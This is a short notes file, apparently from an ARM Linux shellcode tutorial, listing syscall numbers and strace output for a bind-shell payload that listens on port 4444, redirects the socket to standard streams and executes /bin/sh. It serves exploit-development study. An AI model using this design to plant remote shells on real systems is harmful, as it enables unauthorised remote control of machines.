@@ -1,0 +1,27 @@
+$ cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep <function>
+
+--------------------------------------------------------------------------------
+
+#define __NR_socket    (__NR_SYSCALL_BASE+281)
+#define __NR_bind      (__NR_SYSCALL_BASE+282)
+#define __NR_listen    (__NR_SYSCALL_BASE+284)
+#define __NR_accept    (__NR_SYSCALL_BASE+285)
+#define __NR_dup2      (__NR_SYSCALL_BASE+ 63)
+#define __NR_execve    (__NR_SYSCALL_BASE+ 11)
+
+syscall numbers
+
+--------------------------------------------------------------------------------
+
+$ strace -e execve,socket,bind,listen,accept,dup2 ./shellcode
+
+execve("./shellcode", ["./shellcode"], [/* 51 vars */]) = 0
+socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
+listen(3, 2)                            = 0
+accept(3, NULL, NULL)                   = 4
+dup2(4, 0)                              = 0
+dup2(4, 1)                              = 1
+dup2(4, 2)                              = 2
+execve("/bin/sh", NULL, NULL)           = 0
+^Cstrace: Process 2050 detached
